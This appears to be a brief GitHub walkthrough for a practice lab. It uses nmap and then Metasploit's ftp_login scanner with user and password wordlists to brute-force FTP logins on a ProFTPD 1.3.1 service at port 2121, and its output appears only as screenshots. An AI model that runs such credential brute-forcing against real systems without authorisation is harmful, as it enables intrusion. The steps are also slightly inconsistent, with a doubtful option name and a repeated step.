# Port-2121-ProFTPD-1.3.1
1.nmap -sV (target ip)

2.msfconsole

3.msf 6 > search ftp login
![image](https://github.com/thanawut2903/Port-2121-ProFTPD-1.3.1/assets/159118913/1c24377f-54a9-4897-a9bb-00daff1e5d3b)
4.msf 6 > use auxiliary/scanner/ftp/ftp_login

5.msf 6 > show options 
![image](https://github.com/thanawut2903/Port-2121-ProFTPD-1.3.1/assets/159118913/328d495b-676e-45c5-9b28-52860d999f25)
6.msf 6 > set RHOST (target ip)

7.msf 6 > set user_file (path user.txt)

8.msf 6 > set user_pass (path pass.txt)

9.msf 6 > set RHOST (target ip)

10. msf 6 > run
![image](https://github.com/thanawut2903/Port-2121-ProFTPD-1.3.1/assets/159118913/3c3054e1-83a5-4094-9a85-ac72f0216828)

11.ftp (target ip) 
![image](https://github.com/thanawut2903/Port-2121-ProFTPD-1.3.1/assets/159118913/22bc3151-9adb-4f78-9626-4a0ef80e4751)

Reference form : https://www.youtube.com/watch?v=4CkCt-OHcqA
